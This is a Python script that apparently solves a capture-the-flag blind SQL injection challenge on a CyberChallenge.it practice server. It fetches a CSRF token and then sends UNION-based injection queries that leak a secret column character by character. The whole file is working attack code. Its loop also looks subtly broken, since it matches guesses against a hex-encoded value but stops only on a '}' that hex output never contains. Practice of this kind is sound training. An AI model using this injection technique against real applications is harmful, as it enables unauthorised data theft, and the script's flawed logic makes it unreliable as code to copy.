import requests
import string

BASE_URL = "http://sqlinjection.challs.cyberchallenge.it/api/"


class Inj:
    def __init__(self):
        self.sess = requests.Session()
        print(self.sess)
        self.token = self.get_token()
        print(self.token)

    def get_token(self):
        url = f"{BASE_URL}get_token"
        self.req = self.sess.get(url)
        self.json = self.req.json()
        return self.json["token"]

    def request(self, query):
        header = {"X-CSRFToken": self.token}
        payload = {"query": query}
        url = f"{BASE_URL}blind"
        res = self.sess.post(url, json=payload, headers=header)
        res = res.json()
        return res["sql_error"], res["result"]


if __name__ == "__main__":
    inj = Inj()
    alphabet = string.digits + string.ascii_uppercase + string.ascii_lowercase + "{}?!_"
    flag = ""

    while len(flag) == 0 or flag[-1] != "}":
        for c in alphabet:
            f = flag + c
            q = f"1' and false union select asecret,2 from secret where hex(asecret) like '{f}%' and '1'='1"
            error, result = inj.request(q)
            print(f"{q} --> {result}")
            if result == "Success":
                flag = flag + c
                break
